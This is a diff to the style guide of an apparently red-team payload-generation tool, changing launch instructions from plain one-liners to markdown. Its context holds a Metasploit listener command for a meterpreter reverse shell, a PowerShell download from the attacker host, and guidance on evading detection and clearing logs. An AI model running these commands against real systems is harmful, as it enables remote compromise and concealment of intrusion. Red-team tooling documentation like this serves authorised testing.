@@ -695,17 +695,18 @@ Examples:
 
 ### Launch Instructions
 
-1. **Use one-liner commands** - Make commands copy-paste ready, avoid manual multi-step instructions
-2. **Combine transfer and execution** - Show in-memory execution when possible
-3. **Include only essential steps** - Remove verification/status check steps
-4. **Keep support sections** - Always include Notes, Troubleshooting, and Cleanup
-5. **Plain text only** - Do NOT use markdown formatting (no `#` headers, `**bold**`, `` `code` ``, etc.). The TUI uses Rich markup for display, and markdown syntax will be shown literally to users.
+1. **Use markdown formatting** - All launch instructions should be in markdown format
+2. **No title line** - Start directly with the first section heading
+3. **Use h1 headers (#)** - All section headers should be h1 level, not h2 or below
+4. **Use code blocks** - Wrap all commands in proper code blocks with language tags (```bash, ```powershell, ```cmd)
+5. **Use bold labels** - Use **bold** for context labels like "Attacker:" and "Target:"
+6. **Keep support sections** - Always include Notes, Troubleshooting, and Cleanup sections
 
 #### Metasploit Listener
 
-Use one-liner format only:
+Use markdown code block format:
 
-```
+```bash
 msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 ```
 
@@ -759,6 +760,8 @@ Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ outpu
 
 #### Required Sections
 
+Main sections should use h1 headers (#), with h2-h3 (##, ###) for subsections as needed. Always start with h1 for top-level sections.
+
 **Notes:**
 
 - Key features and capabilities
@@ -771,11 +774,12 @@ Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ outpu
 - Common failure scenarios and solutions
 - Compatibility issues
 - Detection/blocking workarounds
+- Use bullet points with **bold** labels for specific issues
 
 **Cleanup:**
 
 - How to remove artifacts
-- File deletion commands
+- File deletion commands in code blocks
 - Log clearing (if applicable)
 
 ### Testing
@@ -1132,6 +1136,13 @@ If your generated C# has `byte[] buf = new byte[] { };` (empty array):
 ### Launch Instructions Standards
 
 All recipes should follow these standards for consistency:
+
+**Markdown Formatting**:
+- Main sections use h1 headers (#) - always start with h1 for top-level sections
+- Subsections can use h2-h3 (##, ###) as needed for organizing content
+- Code blocks with language tags (```bash, ```powershell, ```cmd)
+- Bold labels (**Attacker:**, **Target:**) for context
+- No separate title line at the top of launch instructions
 
 **Code Segment Formatting**: All command examples in launch instructions should start with "$ " (dollar sign + space)
 
